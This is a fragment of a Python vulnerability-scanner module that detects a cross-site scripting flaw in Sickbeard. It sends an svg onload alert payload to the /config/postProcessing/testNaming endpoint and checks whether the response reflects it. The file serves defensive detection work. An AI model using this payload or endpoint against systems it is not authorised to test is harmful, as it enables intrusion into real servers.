#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sickbeard contains a cross-site scripting vulnerability."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sickbeard - Cross-Site Scripting Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
        ...
        'references': ['https://sickbeard.com/', 'https://github.com/midgetspy/Sick-Beard'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E', allow_redirects=False)
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Sickbeard - Cross-Site Scripting detected",
